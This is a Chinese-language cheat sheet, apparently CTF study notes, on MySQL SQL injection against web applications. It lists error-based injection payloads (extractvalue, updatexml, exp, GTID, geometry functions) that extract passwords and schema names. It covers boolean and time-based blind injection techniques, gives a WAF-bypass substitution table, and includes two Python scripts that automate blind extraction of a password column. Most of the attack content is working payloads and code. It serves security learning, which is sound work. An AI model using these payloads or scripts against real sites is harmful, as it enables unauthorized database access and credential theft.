# 注入类型
## union注入
- 前面的查询结果不为空，则返回两次查询的值
- 前面的查询结果为空，则只返回union查询的值
## 报错注入
### 报错手段
- `floor()`
	- `AND (SELECT 1 FROM (SELECT count(*),CONCAT(0x23,(SELECT `password` FROM flag LIMIT 1,2),0x23,FLOOR(RAND(0)*2)) AS x FROM information_schema.`COLUMNS` GROUP BY x) AS y);`
- `extractvalue()`
	- `extractvalue('XML_document','Xpath_string')`  输入的`Xpath_string`不对就会报错
	- **extractvalue函数一次只能查询32位长度，在爆表、列、值的时候三种方法**
		- 加上`limit x,1`逐一查询
			- `select 1,2,(extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema = 'security' limit 0,1))));`
		- 用group_concat函数把查询结果分组聚合
			- `select 1,2,(extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name= 'users' ))));`
		- 用`substring()`函数截取
			- `select (extractvalue(1,concat(0x7e,substring(hex((select database())),1,32))));`
- `updatexml()`
	- `updatexml('XML_document','Xpath_string','New_value')` 和 `extractvalue()`一样
	- `select (updatexml(1,concat(0x7e,(database()),0x7e),1));`
- `exp()`
	- 输入数据大于706数据溢出报错
	- 进行嵌套查询的时候子查询出来的的结果是作为一个派生表来进行上一级的查询的，所以子查询的结果必须要有一个别名
	- `or exp(~(select * from (select (concat(0x7e,(SELECT GROUP_CONCAT(user,':',password) from manage),0x7e))) as asd))`
- `GTID`
	- `gtid_subset()`
		- `OR gtid_subset(CONCAT(0x7e,(SELECT GROUP_CONCAT(`Password`) FROM flag),0x7e),1);`
	- `getid_subtract()`
		- `OR gtid_subtract(CONCAT(0x7e,(SELECT GROUP_CONCAT(`Password`) FROM flag),0x7e),1);`
- `geometrycollection()`
	- MYSQL无法用这样字符串画出图形,所以报错
	- `and geometrycollection((select * from(select * from (操作代码)a)b))`
- `multipoint()`
	- `select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));`
- `polygon()`
	- `select * from test where id=1 and polygon((select * from(select * from(select user())a)b));`
- `multipolygon()`
- `linestring()`
- `multilinestring()`

>`geometrycollection()`、`multipoint()`、`polygon()`、`linestring()`、`multilinestring()` 似乎要在mysql5.1才有用现在已经很鸡肋了

## 盲注
### 布尔盲注
#### 函数
- `left(string,n)` 查看前n个字符是否匹配
- `mid(column_name,start[,length])` 截取字符串一部分
	- `column_name`：必需，要提取字符的字段
	- `start`：必需，规定开始位置。
	- `length`：可选，要返回的字符数。如果省略，则`mid()`函数返回剩余文本
- `substr()`&`substring()`
	- `string substring(string, start, length)`
	- `string substr(string, start, length)`
- `regexp()`判断正则
- `like()`
#### 脚本
```python
import requests

url = ""

result = ''
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127

    while head < tail:
        mid = (head + tail) >> 1
        payload = f'1=if(ascii(substr((select  password from ctfshow_user4 limit 24,1),{i},1))>{mid},1,0) -- -'
        r = requests.get(url + payload)
        # 回显信息
        if "admin" in r.text:
            head = mid + 1
        else:
            tail = mid

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)

```
### 时间盲注
#### 函数
- `if()
- `sleep()` 及其替代
	- `benchmark(count,expr)`
		- count参数代表的是执行的次数
		- expr参数代表的是执行的表达式
		- `select benchmark(10000000,md5(0x41))` 
	- 笛卡尔积
		- `SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;`
	- `get_lock(str,timeout)`
		- get_lock会按照key来加锁，别的客户端再以同样的key加锁时就加不了了，处于等待状态。在一个session中锁定变量，同时通过另外一个session执行，将会产生延时。
		- 使用这种方法进行诸如判断时，必须要提供长连接，即`mysql_pconnect`
		- python 脚本中间需要`time.sleep(90)`让客户端认为是另一个用户，
		- payload 做一个ascii的判断就可以，放到1/0的位置
		- ![](attachments/Pasted%20image%2020240221131605.png)
	- `rlike`  通过`rpad`或`repeat`构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短 `regexp`也可以
		- `rpad(str,len,padstr)`
			- rpad(str,len,padstr) 返回字符串 str, 其右边由字符串padstr 填补到len 字符长度。假如str 的长度大于len, 则返回值被缩短至 len 字符。
		- `repeat(str,count)`
			- 返回由字符串str重复count次的字符串， 如果计数小于1，则返回一个空字符串。返回NULL如果str或count为NULL。
		- `select concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b'`
		- `select ((concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')))a) regexp '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b';`

#### 脚本
```python
import requests

url = ""

result = ''
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127

    while head < tail:
        mid = (head + tail) >> 1
        payload = f'1=if(ascii(substr((select  password from ctfshow_user5 limit 24,1),{i},1))>{mid},sleep(2),0) -- -'
        try:
            r = requests.get(url + payload, timeout=0.5)
            tail = mid
        except Exception as e:
            head = mid + 1

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
```
# Bypass
## 大小写绕过
`SeleCt`
## 双写绕过

## 注释
`/*! */类型的注释，内部的语句会被执行`

## 使用16进制绕过特定字符

## 字符与函数代替
|代替字符|数|代替字符|代替的数|数、字|代替的数|
|---|---|---|---|---|---|
|false、!pi()|0|ceil(pi()*pi())|A|ceil((pi()+pi())*pi())|K|
|true、!(!pi())|1|ceil(pi()*pi())+true|B|ceil(ceil(pi())*version())|L|
|true+true|2|ceil(pi()+pi()+version())|C|ceil(pi()*ceil(pi()+pi()))|M|
|floor(pi())、~~pi()|3|floor(pi()*pi()+pi())|D|ceil((pi()+ceil(pi()))*pi())|N|
|ceil(pi())|4|ceil(pi()*pi()+pi())|E|ceil(pi())*ceil(version())|O|
|floor(version()) //注意版本|5|ceil(pi()*pi()+version())|F|floor(pi()*(version()+pi()))|P|
|ceil(version())|6|floor(pi()*version())|G|floor(version()*version())|Q|
|ceil(pi()+pi())|7|ceil(pi()*version())|H|ceil(version()*version())|R|
|floor(version()+pi())|8|ceil(pi()*version())+true|I|ceil(pi()_pi()_pi()-pi())|S|
|floor(pi()*pi())|9|floor((pi()+pi())*pi())|J|floor(pi()_pi()_floor(pi()))|T|

